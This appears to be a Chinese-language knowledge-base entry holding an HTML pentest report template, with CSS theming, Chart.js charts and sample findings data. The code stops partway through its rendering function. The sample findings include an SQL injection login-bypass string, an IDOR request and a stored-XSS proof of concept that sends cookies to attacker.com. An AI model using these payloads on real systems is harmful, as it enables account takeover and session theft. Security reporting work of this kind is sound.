---
id: 09-001
title: "🌐 安全报告模板 - HTML格式 (Security Report Template - HTML)"
category: 报告撰写
category_en: Reporting
difficulty: ★★★
tools: "Chart.js, HTML/CSS, Python, JavaScript"
last_updated: 2025-07
tags: ["reporting", "documentation", "cvss", "pentest-report", "markdown"]
subdomain: reporting
nist_csf: ["ID.GV-01", "ID.SC-03"]
mitre_attack: []
---
# 🌐 安全报告模板 - HTML格式 (Security Report Template - HTML)

> **版本**: v2.0 | **更新**: 2025-Q1 | **特性**: 响应式设计、Chart.js图表、暗色模式、侧边栏导航、打印/PDF导出、AI Agent原生接口

## 概述

响应式 HTML 安全报告模板，含 CSS/JS 交互功能。本模板在浏览器中可直接打开，支持打印为 PDF 格式，适合在线交付和演示场景。

### 模板特性

| 特性 | 说明 |
|:---|:---|
| 📱 响应式布局 | 适配桌面、平板、手机 |
| 📊 Chart.js 图表 | 风险分布饼图、柱状图、雷达图 |
| 🌓 暗色/亮色模式切换 | 一键切换主题 |
| 📑 固定侧边栏导航 | 章节快速跳转 |
| 🖨️ 打印/PDF 导出 | Ctrl+P 即可导出为 PDF |
| 📈 风险热力图 | 多维风险矩阵 |
| 🤖 AI Agent 原生接口 | 标准 JSON Schema, Python 生成器 |

---

## HTML 报告完整模板

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全评估报告 - Security Assessment Report</title>
    <meta name="description" content="渗透测试安全评估报告 - 客户名称">
    <meta name="classification" content="机密">

    <!-- Chart.js CDN -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>

    <style>
        /* ========== CSS 变量：主题色 ========== */
        :root {
            /* 品牌色 */
            --primary: #1a237e;
            --primary-light: #3949ab;
            --primary-dark: #0d1b5e;
            --accent: #00897b;

            /* 风险等级色 */
            --critical-color: #dc3545;
            --critical-bg: #fde8e8;
            --high-color: #fd7e14;
            --high-bg: #fff3e0;
            --medium-color: #ffc107;
            --medium-bg: #fff8e1;
            --low-color: #0d6efd;
            --low-bg: #e3f2fd;
            --info-color: #6c757d;
            --info-bg: #f5f5f5;

            /* 文字色 */
            --text-primary: #212529;
            --text-secondary: #495057;
            --text-muted: #6c757d;
            --link-color: #1565c0;

            /* 背景色 */
            --bg-body: #f8f9fa;
            --bg-white: #ffffff;
            --bg-sidebar: #1a237e;
            --bg-sidebar-hover: #283593;
            --bg-code: #f5f5f5;

            /* 边框 */
            --border-color: #e0e0e0;
            --border-radius: 8px;
            --shadow: 0 2px 12px rgba(0,0,0,0.08);
            --shadow-lg: 0 4px 24px rgba(0,0,0,0.12);

            /* 字体 */
            --font-sans: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', system-ui, -apple-system, sans-serif;
            --font-mono: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
        }

        /* ========== 暗色模式 ========== */
        [data-theme="dark"] {
            --primary: #5c6bc0;
            --primary-light: #7986cb;
            --primary-dark: #3949ab;

            --text-primary: #e0e0e0;
            --text-secondary: #aaaaaa;
            --text-muted: #888888;
            --link-color: #64b5f6;

            --bg-body: #121212;
            --bg-white: #1e1e1e;
            --bg-sidebar: #1a1a2e;
            --bg-sidebar-hover: #16213e;

            --border-color: #333333;
            --shadow: 0 2px 12px rgba(0,0,0,0.3);
            --shadow-lg: 0 4px 24px rgba(0,0,0,0.4);

            --critical-bg: #2d1518;
            --high-bg: #2d1f0e;
            --medium-bg: #2d2814;
            --low-bg: #0d1b2e;
            --info-bg: #1e1e1e;
        }

        /* ========== 全局样式 ========== */
        * { margin: 0; padding: 0; box-sizing: border-box; }

        html {
            scroll-behavior: smooth;
            scroll-padding-top: 20px;
        }

        body {
            font-family: var(--font-sans);
            background: var(--bg-body);
            color: var(--text-primary);
            line-height: 1.7;
            display: flex;
            min-height: 100vh;
        }

        a {
            color: var(--link-color);
            text-decoration: none;
        }
        a:hover { text-decoration: underline; }

        /* ========== 侧边栏 ========== */
        .sidebar {
            position: fixed;
            width: 280px;
            height: 100vh;
            background: var(--bg-sidebar);
            color: white;
            overflow-y: auto;
            z-index: 1000;
            transition: transform 0.3s;
        }
        .sidebar-header {
            padding: 24px 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .sidebar-header h2 {
            font-size: 18px;
            font-weight: 600;
        }
        .sidebar-header .report-id {
            font-size: 12px;
            opacity: 0.7;
            margin-top: 4px;
        }
        .sidebar-nav { padding: 12px 0; }
        .sidebar-nav a {
            display: block;
            padding: 10px 24px;
            color: rgba(255,255,255,0.75);
            font-size: 14px;
            transition: all 0.2s;
            border-left: 3px solid transparent;
        }
        .sidebar-nav a:hover,
        .sidebar-nav a.active {
            color: white;
            background: var(--bg-sidebar-hover);
            border-left-color: var(--accent);
            text-decoration: none;
        }
        .sidebar-nav .nav-section {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            padding: 16px 24px 6px;
            color: rgba(255,255,255,0.4);
            font-weight: 600;
        }

        /* ========== 主内容 ========== */
        .main-content {
            margin-left: 280px;
            flex: 1;
            padding: 0;
            max-width: 100%;
        }

        /* ========== 顶部工具栏 ========== */
        .toolbar {
            position: sticky;
            top: 0;
            z-index: 999;
            background: var(--bg-white);
            border-bottom: 1px solid var(--border-color);
            padding: 12px 40px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 12px;
            box-shadow: var(--shadow);
        }
        .toolbar .status-badge {
            margin-right: auto;
            font-size: 13px;
            color: var(--text-muted);
        }
        .toolbar button {
            background: var(--bg-body);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 6px 14px;
            cursor: pointer;
            font-size: 13px;
            color: var(--text-primary);
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .toolbar button:hover {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }

        /* ========== 封面区 ========== */
        .cover {
            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 50%, var(--primary-light) 100%);
            color: white;
            padding: 80px 60px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .cover::before {
            content: "🛡️";
            position: absolute;
            right: 40px;
            bottom: 40px;
            font-size: 120px;
            opacity: 0.08;
        }
        .cover h1 {
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        .cover .subtitle {
            font-size: 18px;
            opacity: 0.85;
            margin-bottom: 32px;
        }
        .cover .meta-grid {
            display: flex;
            justify-content: center;
            gap: 40px;
            flex-wrap: wrap;
            max-width: 800px;
            margin: 0 auto;
        }
        .cover .meta-item {
            text-align: center;
            min-width: 140px;
        }
        .cover .meta-item .label {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            opacity: 0.6;
        }
        .cover .meta-item .value {
            font-size: 16px;
            font-weight: 600;
            margin-top: 4px;
        }
        .cover .classification {
            display: inline-block;
            margin-top: 32px;
            padding: 6px 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 20px;
            font-size: 14px;
            letter-spacing: 2px;
        }

        /* ========== 内容容器 ========== */
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 40px 48px;
        }

        /* ========== 章节 ========== */
        .section {
            margin-bottom: 48px;
        }
        .section-title {
            font-size: 24px;
            font-weight: 700;
            color: var(--primary);
            padding-bottom: 12px;
            border-bottom: 3px solid var(--accent);
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .section-title .section-num {
            background: var(--primary);
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: 600;
        }

        .subsection-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text-primary);
            margin: 24px 0 16px;
            padding-left: 12px;
            border-left: 3px solid var(--accent);
        }

        /* ========== 统计卡片 ========== */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 16px;
            margin: 20px 0;
        }
        .stat-card {
            background: var(--bg-white);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius);
            padding: 20px;
            text-align: center;
            box-shadow: var(--shadow);
        }
        .stat-card .stat-number {
            font-size: 36px;
            font-weight: 700;
            line-height: 1.2;
        }
        .stat-card .stat-label {
            font-size: 13px;
            color: var(--text-muted);
            margin-top: 4px;
        }
        .stat-card.critical .stat-number { color: var(--critical-color); }
        .stat-card.high .stat-number { color: var(--high-color); }
        .stat-card.medium .stat-number { color: var(--medium-color); }
        .stat-card.low .stat-number { color: var(--low-color); }
        .stat-card.total .stat-number { color: var(--primary); }

        /* ========== 图表容器 ========== */
        .charts-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
            margin: 24px 0;
        }
        .chart-card {
            background: var(--bg-white);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius);
            padding: 24px;
            box-shadow: var(--shadow);
        }
        .chart-card h4 {
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 16px;
            text-align: center;
        }
        .chart-card canvas {
            max-height: 280px;
        }

        /* ========== 表格 ========== */
        .table-wrapper {
            overflow-x: auto;
            margin: 16px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
            background: var(--bg-white);
            border-radius: var(--border-radius);
            overflow: hidden;
            box-shadow: var(--shadow);
        }
        thead {
            background: var(--primary);
            color: white;
        }
        th {
            padding: 12px 16px;
            text-align: left;
            font-weight: 600;
            font-size: 13px;
        }
        td {
            padding: 10px 16px;
            border-bottom: 1px solid var(--border-color);
        }
        tr:hover { background: rgba(0,0,0,0.02); }
        [data-theme="dark"] tr:hover { background: rgba(255,255,255,0.02); }

        /* ========== 漏洞详情卡片 ========== */
        .finding-card {
            background: var(--bg-white);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius);
            padding: 28px;
            margin-bottom: 24px;
            box-shadow: var(--shadow);
            border-left: 4px solid;
        }
        .finding-card.critical { border-left-color: var(--critical-color); }
        .finding-card.high { border-left-color: var(--high-color); }
        .finding-card.medium { border-left-color: var(--medium-color); }
        .finding-card.low { border-left-color: var(--low-color); }
        .finding-card.info { border-left-color: var(--info-color); }

        .finding-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 8px;
        }
        .finding-header h3 {
            font-size: 18px;
            font-weight: 600;
        }
        .severity-badge {
            display: inline-block;
            padding: 4px 14px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
            white-space: nowrap;
        }
        .severity-badge.critical { background: var(--critical-bg); color: var(--critical-color); }
        .severity-badge.high { background: var(--high-bg); color: var(--high-color); }
        .severity-badge.medium { background: var(--medium-bg); color: #856404; }
        .severity-badge.low { background: var(--low-bg); color: var(--low-color); }
        .severity-badge.info { background: var(--info-bg); color: var(--info-color); }

        .finding-meta {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 8px;
            margin-bottom: 16px;
            padding: 12px 16px;
            background: var(--bg-body);
            border-radius: 6px;
            font-size: 13px;
        }
        .finding-meta dt {
            float: left;
            width: 100px;
            font-weight: 600;
            color: var(--text-muted);
        }
        .finding-meta dd {
            margin-left: 100px;
            margin-bottom: 4px;
        }

        .finding-section {
            margin: 16px 0;
        }
        .finding-section h4 {
            font-size: 14px;
            font-weight: 600;
            color: var(--primary);
            margin-bottom: 8px;
        }

        /* ========== 代码块 ========== */
        pre {
            background: var(--bg-code);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 16px;
            overflow-x: auto;
            font-family: var(--font-mono);
            font-size: 13px;
            line-height: 1.5;
            margin: 12px 0;
        }
        code {
            font-family: var(--font-mono);
            font-size: 13px;
            background: var(--bg-code);
            padding: 2px 6px;
            border-radius: 3px;
        }

        /* ========== 修复建议 ========== */
        .remediation-card {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin: 16px 0;
        }
        .remediation-item {
            padding: 16px;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        .remediation-item .priority {
            font-weight: 700;
            font-size: 14px;
        }
        .remediation-item.p0 { border-left: 3px solid var(--critical-color); }
        .remediation-item.p1 { border-left: 3px solid var(--high-color); }
        .remediation-item.p2 { border-left: 3px solid var(--medium-color); }
        .remediation-item.p3 { border-left: 3px solid var(--info-color); }

        /* ========== 进度条 ========== */
        .progress-bar {
            height: 8px;
            background: var(--bg-body);
            border-radius: 4px;
            overflow: hidden;
            margin: 4px 0;
        }
        .progress-bar .fill {
            height: 100%;
            border-radius: 4px;
            transition: width 0.6s;
        }

        /* ========== 页脚 ========== */
        .footer {
            text-align: center;
            padding: 32px 48px;
            color: var(--text-muted);
            font-size: 13px;
            border-top: 1px solid var(--border-color);
            margin-top: 48px;
        }

        /* ========== 打印样式 ========== */
        @media print {
            .sidebar, .toolbar { display: none; }
            .main-content { margin-left: 0; }
            .cover { padding: 40px 30px; }
            .container { padding: 20px; }
            .finding-card { break-inside: avoid; }
            .charts-grid { grid-template-columns: 1fr; }
            .stats-grid { grid-template-columns: repeat(5, 1fr); }
        }

        /* ========== 响应式 ========== */
        @media (max-width: 900px) {
            .sidebar { transform: translateX(-100%); }
            .sidebar.open { transform: translateX(0); }
            .main-content { margin-left: 0; }
            .charts-grid { grid-template-columns: 1fr; }
            .container { padding: 24px 20px; }
            .cover { padding: 40px 20px; }
            .cover h1 { font-size: 24px; }
            .remediation-card { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<!-- ========== 侧边栏 ========== -->
<aside class="sidebar" id="sidebar">
    <div class="sidebar-header">
        <h2>🛡️ 安全评估报告</h2>
        <div class="report-id">REP-2024-001 | v1.0</div>
    </div>
    <nav class="sidebar-nav">
        <div class="nav-section">📄 概述</div>
        <a href="#cover" class="active">报告封面</a>
        <a href="#executive">执行摘要</a>
        <div class="nav-section">📋 范围与方法</div>
        <a href="#scope">测试范围</a>
        <a href="#methodology">测试方法</a>
        <div class="nav-section">📊 风险概览</div>
        <a href="#risk-overview">风险分布</a>
        <a href="#charts">统计图表</a>
        <div class="nav-section">🔍 漏洞详情</div>
        <a href="#findings">漏洞列表</a>
        <div class="nav-section">🔧 修复建议</div>
        <a href="#remediation">修复计划</a>
        <a href="#compliance">合规映射</a>
        <div class="nav-section">📎 附录</div>
        <a href="#retest">复测结果</a>
        <a href="#appendix">附录信息</a>
    </nav>
</aside>

<!-- ========== 主内容 ========== -->
<main class="main-content">

    <!-- 工具栏 -->
    <div class="toolbar">
        <span class="status-badge">🔒 机密 &nbsp;|&nbsp; 版本 v1.0</span>
        <button onclick="document.getElementById('sidebar').classList.toggle('open')">
            ☰ 菜单
        </button>
        <button onclick="toggleTheme()">
            🌓 主题
        </button>
        <button onclick="window.print()">
            🖨️ 打印/PDF
        </button>
    </div>

    <!-- ===== 封面 ===== -->
    <section class="cover" id="cover">
        <h1>🛡️ 渗透测试安全评估报告</h1>
        <p class="subtitle">Penetration Test Security Assessment Report</p>
        <div class="meta-grid">
            <div class="meta-item">
                <div class="label">客户名称</div>
                <div class="value" id="cover-client">[客户名称]</div>
            </div>
            <div class="meta-item">
                <div class="label">测试周期</div>
                <div class="value" id="cover-period">YYYY-MM-DD 至 YYYY-MM-DD</div>
            </div>
            <div class="meta-item">
                <div class="label">测试人员</div>
                <div class="value" id="cover-tester">[姓名]</div>
            </div>
            <div class="meta-item">
                <div class="label">文档版本</div>
                <div class="value" id="cover-version">v1.0</div>
            </div>
            <div class="meta-item">
                <div class="label">报告日期</div>
                <div class="value" id="cover-date">YYYY-MM-DD</div>
            </div>
        </div>
        <div class="classification" id="cover-classification">🔒 机密</div>
    </section>

    <div class="container">

        <!-- ===== 执行摘要 ===== -->
        <section class="section" id="executive">
            <h2 class="section-title"><span class="section-num">1</span> 执行摘要</h2>

            <div class="stats-grid" id="stats-grid">
                <div class="stat-card total">
                    <div class="stat-number" id="stat-total">0</div>
                    <div class="stat-label">总漏洞数</div>
                </div>
                <div class="stat-card critical">
                    <div class="stat-number" id="stat-critical">0</div>
                    <div class="stat-label">严重</div>
                </div>
                <div class="stat-card high">
                    <div class="stat-number" id="stat-high">0</div>
                    <div class="stat-label">高危</div>
                </div>
                <div class="stat-card medium">
                    <div class="stat-number" id="stat-medium">0</div>
                    <div class="stat-label">中危</div>
                </div>
                <div class="stat-card low">
                    <div class="stat-number" id="stat-low">0</div>
                    <div class="stat-label">低危+信息</div>
                </div>
            </div>

            <p id="executive-text">本次安全评估共发现 ... </p>

            <div class="subsection-title">关键发现</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>#</th><th>漏洞名称</th><th>风险等级</th><th>影响说明</th></tr>
                    </thead>
                    <tbody id="executive-findings">
                        <!-- 由 JS 动态生成 -->
                    </tbody>
                </table>
            </div>
        </section>

        <!-- ===== 测试范围 ===== -->
        <section class="section" id="scope">
            <h2 class="section-title"><span class="section-num">2</span> 测试范围与方法</h2>

            <div class="subsection-title">在测范围 (In-Scope)</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>#</th><th>目标</th><th>类型</th><th>测试方法</th></tr>
                    </thead>
                    <tbody id="scope-targets">
                        <!-- 由 JS 动态生成 -->
                    </tbody>
                </table>
            </div>

            <div class="subsection-title">测试方法</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>阶段</th><th>活动描述</th><th>工具/技术</th></tr>
                    </thead>
                    <tbody>
                        <tr><td>1. 信息收集</td><td>子域名枚举、端口扫描、技术栈识别</td><td>Sublist3r, Nmap, WhatWeb</td></tr>
                        <tr><td>2. 漏洞扫描</td><td>自动化漏洞扫描 + 手动验证</td><td>Nuclei, Burp Suite</td></tr>
                        <tr><td>3. 手动测试</td><td>深度手工测试，业务逻辑测试</td><td>Burp Suite Repeater/Intruder</td></tr>
                        <tr><td>4. 漏洞验证</td><td>确认漏洞可被利用，评估影响范围</td><td>自定义PoC, Metasploit</td></tr>
                        <tr><td>5. 报告编制</td><td>整理发现、评级、修复建议</td><td>本报告模板</td></tr>
                    </tbody>
                </table>
            </div>
        </section>

        <!-- ===== 风险概览 ===== -->
        <section class="section" id="risk-overview">
            <h2 class="section-title"><span class="section-num">3</span> 风险分布概览</h2>

            <div class="charts-grid" id="charts">
                <div class="chart-card">
                    <h4>📊 漏洞严重性分布</h4>
                    <canvas id="severityChart"></canvas>
                </div>
                <div class="chart-card">
                    <h4>📈 漏洞类型分布</h4>
                    <canvas id="typeChart"></canvas>
                </div>
            </div>

            <div class="subsection-title">漏洞严重性分布表</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>风险等级</th><th>CVSS范围</th><th>数量</th><th>占比</th><th>进度</th></tr>
                    </thead>
                    <tbody id="severity-table">
                        <!-- 由 JS 动态生成 -->
                    </tbody>
                </table>
            </div>

            <div class="subsection-title">受影响的系统分布</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>系统/组件</th><th>严重</th><th>高危</th><th>中危</th><th>低危</th><th>合计</th></tr>
                    </thead>
                    <tbody id="system-table">
                        <!-- 由 JS 动态生成 -->
                    </tbody>
                </table>
            </div>
        </section>

        <!-- ===== 漏洞详情 ===== -->
        <section class="section" id="findings">
            <h2 class="section-title"><span class="section-num">4</span> 漏洞详情</h2>
            <p>以下按风险等级从高到低排列：</p>
            <div id="findings-container">
                <!-- 由 JS 动态生成 -->
            </div>
        </section>

        <!-- ===== 修复建议 ===== -->
        <section class="section" id="remediation">
            <h2 class="section-title"><span class="section-num">5</span> 修复建议汇总</h2>

            <div class="subsection-title">按优先级排序</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>优先级</th><th>漏洞编号</th><th>漏洞名称</th><th>CVSS</th><th>修复期限</th></tr>
                    </thead>
                    <tbody id="remediation-table">
                        <!-- 由 JS 动态生成 -->
                    </tbody>
                </table>
            </div>

            <div class="subsection-title">修复优先级定义</div>
            <div class="remediation-card" id="priority-defs">
                <div class="remediation-item p0">
                    <div class="priority">P0 - 🔴 紧急</div>
                    <div>可被远程利用且造成严重业务影响</div>
                    <div style="font-size:13px;color:var(--text-muted);margin-top:4px;">响应要求：24小时内启动修复</div>
                </div>
                <div class="remediation-item p1">
                    <div class="priority">P1 - 🟠 高</div>
                    <div>可能造成较严重的业务影响</div>
                    <div style="font-size:13px;color:var(--text-muted);margin-top:4px;">响应要求：1周内修复</div>
                </div>
                <div class="remediation-item p2">
                    <div class="priority">P2 - 🟡 中</div>
                    <div>需要一定条件才能利用</div>
                    <div style="font-size:13px;color:var(--text-muted);margin-top:4px;">响应要求：2周内修复</div>
                </div>
                <div class="remediation-item p3">
                    <div class="priority">P3 - 🔵 低</div>
                    <div>信息泄露或最佳实践改进</div>
                    <div style="font-size:13px;color:var(--text-muted);margin-top:4px;">响应要求：1个月内修复</div>
                </div>
            </div>
        </section>

        <!-- ===== 附录 ===== -->
        <section class="section" id="appendix">
            <h2 class="section-title"><span class="section-num">6</span> 附录</h2>

            <div class="subsection-title">测试工具清单</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>工具</th><th>版本</th><th>用途</th></tr>
                    </thead>
                    <tbody>
                        <tr><td>Burp Suite Professional</td><td>2024.x</td><td>HTTP代理、手动测试</td></tr>
                        <tr><td>Nuclei</td><td>3.x</td><td>自动化漏洞扫描</td></tr>
                        <tr><td>SQLMap</td><td>1.8.x</td><td>SQL注入检测与利用</td></tr>
                        <tr><td>Nmap</td><td>7.9x</td><td>端口/服务发现</td></tr>
                    </tbody>
                </table>
            </div>

            <div class="subsection-title">风险接受记录</div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr><th>漏洞编号</th><th>接受理由</th><th>批准人</th><th>接受日期</th></tr>
                    </thead>
                    <tbody id="risk-acceptance">
                        <!-- 由 JS 动态生成 -->
                    </tbody>
                </table>
            </div>

            <div class="subsection-title">免责声明</div>
            <div style="background:var(--bg-body);border-radius:6px;padding:16px;font-size:13px;color:var(--text-secondary);">
                <p>1. 本报告仅对测试期间指定的范围、条件及时间节点有效，不保证覆盖所有可能的安全隐患。</p>
                <p>2. 测试结果基于测试期间使用的工具和技术手段，新的攻击手法或漏洞可能不在本次测试覆盖范围内。</p>
                <p>3. 修复建议仅供参考，具体实施需结合业务实际情况、系统架构和技术可行性进行评估。</p>
                <p>4. 本报告包含敏感安全信息，未经授权不得向第三方披露本报告的全部或部分内容。</p>
            </div>
        </section>

    </div>

    <div class="footer">
        <p>🛡️ 本报告由安全评估团队根据行业最佳实践编制</p>
        <p>遵循 PTES、OWASP Testing Guide v4.2、NIST SP 800-115 标准</p>
        <p>生成时间: <span id="generated-time"></span></p>
        <p style="margin-top:8px;font-size:12px;">Copyright &copy; 2024 Security Assessment Team. All Rights Reserved.</p>
    </div>

</main>

<!-- ========== JavaScript ========== -->
<script>
// ===== 暗色模式 =====
function toggleTheme() {
    const html = document.documentElement;
    const current = html.getAttribute('data-theme');
    html.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
    localStorage.setItem('theme', html.getAttribute('data-theme'));
}
(function() {
    const saved = localStorage.getItem('theme');
    if (saved) document.documentElement.setAttribute('data-theme', saved);
})();

// ===== 侧边栏高亮 =====
document.addEventListener('scroll', function() {
    const links = document.querySelectorAll('.sidebar-nav a');
    let current = '';
    links.forEach(a => a.classList.remove('active'));
    document.querySelectorAll('.section, .cover').forEach(section => {
        if (window.scrollY >= section.offsetTop - 120) {
            current = '#' + section.id;
        }
    });
    const activeLink = document.querySelector(`.sidebar-nav a[href="${current}"]`);
    if (activeLink) activeLink.classList.add('active');
});

// ===== 报告数据 =====
const REPORT_DATA = {
    meta: {
        client_name: '示例科技有限公司',
        test_start: '2024-06-01',
        test_end: '2024-06-10',
        tester: '张三',
        version: 'v1.0',
        report_date: '2024-06-15',
        classification: '机密'
    },
    summary: {
        total: 9,
        critical: 2,
        high: 3,
        medium: 2,
        low: 1,
        info: 1,
        text: '本次安全评估共发现 <strong>9</strong> 个安全漏洞，其中严重漏洞 <strong>2</strong> 个，高危漏洞 <strong>3</strong> 个。严重和高危合计占比 <strong>55.6%</strong>，整体安全风险评级为 <strong>高危</strong>，建议立即启动修复流程。',
        key_findings: [
            { title: 'SQL注入漏洞 - 登录接口', severity: 'Critical', impact: '可绕过认证获取全部用户数据' },
            { title: '存储型XSS - 用户反馈功能', severity: 'Critical', impact: '可在管理后台执行任意JS' },
            { title: 'IDOR越权 - 订单查询接口', severity: 'High', impact: '可访问其他用户订单信息' }
        ]
    },
    severity_data: {
        labels: ['严重', '高危', '中危', '低危', '信息'],
        counts: [2, 3, 2, 1, 1],
        colors: ['#dc3545', '#fd7e14', '#ffc107', '#0d6efd', '#6c757d']
    },
    type_data: {
        labels: ['SQL注入', 'XSS', '认证缺陷', '配置不当', '信息泄露', '其他'],
        counts: [2, 2, 2, 1, 1, 1],
        colors: ['#dc3545', '#fd7e14', '#ffc107', '#0d6efd', '#6c757d', '#20c997']
    },
    findings: [
        {
            id: 'VULN-001',
            title: 'SQL注入漏洞 - 登录接口',
            severity: 'Critical',
            cvss: '9.8',
            cvss_vector: 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
            component: '/api/v1/login',
            type: 'SQL Injection',
            cwe: 'CWE-89',
            owasp: 'A03:2021 – Injection',
            description: '登录接口 username 参数未进行转义处理...',
            impact: '攻击者可绕过认证获取全部用户数据',
            remediation_short: '使用参数化查询替换字符串拼接',
            remediation_long: '引入ORM框架，实施输入验证白名单策略',
            status: '未修复',
            steps: [
                '访问 https://app.example.com/login',
                "在 username 字段输入: ' OR '1'='1' -- -",
                '系统返回管理员会话 Token'
            ],
            poc: "POST /api/v1/login HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\n\n{\"username\":\"' OR '1'='1' --\",\"password\":\"test\"}"
        },
        {
            id: 'VULN-002',
            title: '存储型XSS - 用户反馈功能',
            severity: 'Critical',
            cvss: '9.0',
            cvss_vector: 'AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H',
            component: '/feedback/submit',
            type: 'Stored XSS',
            cwe: 'CWE-79',
            owasp: 'A03:2021 – XSS',
            description: '用户反馈内容未进行输出编码...',
            impact: '攻击者可在管理后台执行任意JS代码',
            remediation_short: '对用户输入进行上下文感知的输出编码',
            remediation_long: '实施Content-Security-Policy (CSP) 策略',
            status: '未修复',
            steps: [
                '在反馈表单中提交: <script>alert(1)</script>',
                '管理员查看反馈列表时脚本自动执行'
            ],
            poc: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>'
        },
        {
            id: 'VULN-003',
            title: 'IDOR越权 - 订单查询接口',
            severity: 'High',
            cvss: '8.2',
            cvss_vector: 'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N',
            component: '/api/v1/orders/{id}',
            type: 'IDOR',
            cwe: 'CWE-639',
            owasp: 'A01:2021 – Access Control',
            description: '订单查询接口未校验用户所有权...',
            impact: '可访问其他用户的订单信息',
            remediation_short: '在每个API端点实施所有权检查',
            remediation_long: '引入统一的访问控制层(Authz)',
            status: '未修复',
            steps: [
                '以用户A登录并获取订单ID=1001',
                '修改订单ID=1002，成功返回订单B的数据'
            ],
            poc: "GET /api/v1/orders/1002 HTTP/1.1\nHost: app.example.com\nAuthorization: Bearer [userA_token]"
        },
        {
            id: 'VULN-004',
            title: '弱密码策略',
            severity: 'High',
            cvss: '7.5',
            cvss_vector: 'AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L',
            component: '/register',
            type: 'Weak Password Policy',
            cwe: 'CWE-521',
            owasp: 'A07:2021 – Auth Failure',
            description: '注册接口允许设置弱密码...',
            impact: '攻击者可通过暴力破解获取用户账户',
            remediation_short: '实施密码复杂度策略(12位+大小写+数字+特殊字符)',
            remediation_long: '引入多因素认证(MFA)',
            status: '未修复',
            steps: [],
            poc: ''
        },
        {
            id: 'VULN-005',
            title: 'CORS配置不当',
            severity: 'High',
            cvss: '7.1',
            cvss_vector: 'AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N',
            component: 'API 响应头',
            type: 'CORS Misconfiguration',
            cwe: 'CWE-942',
            owasp: 'A05:2021 – Misconfiguration',
            description: 'API 返回 Access-Control-Allow-Origin: *...',
            impact: '攻击者的恶意网站可跨域读取API数据',
            remediation_short: '配置白名单域名替代通配符',
            remediation_long: '实施严格的CORS策略',
            status: '未修复',
            steps: [],
            poc: ''
        }
    ],
    systems: [
        { name: '主站 Web', critical: 1, high: 1, medium: 1, low: 0 },
        { name: 'API 接口', critical: 1, high: 2, medium: 1, low: 0 },
        { name: '管理后台', critical: 0, high: 0, medium: 0, low: 1 },
        { name: '移动端', critical: 0, high: 0, medium: 0, low: 0 }
    ]
};

// ===== 渲染函数 =====
function initReport() {
    const d = REPORT_DATA;

    // 封面
    document.getElementById('cover-client').textContent = d.meta.client_name;
    document.getElementById('cover-period').textContent = `${d.meta.test_start} 至 ${d.meta.test_end}`;
    document.getElementById('cover-tester').textContent = d.meta.tester;
    document.getElementById('cover-version').textContent = d.meta.version;
    document.getElementById('cover-date').textContent = d.meta.report_date;
    document.getElementById('cover-classification').textContent = `🔒 ${d.meta.classification}`;

    // 统计数字
    document.getElementById('stat-total').textContent = d.summary.total;
    document.getElementById('stat-critical').textContent = d.summary.critical;
    document.getElementById('stat-high').textContent = d.summary.high;
    document.getElementById('stat-medium').textContent = d.summary.medium;
    document.getElementById('stat-low').textContent = d.summary.low + d.summary.info;

    // 执行摘要
    document.getElementById('executive-text').innerHTML = d.summary.text;

    // 关键发现
    const ef = document.getElementById('executive-findings');
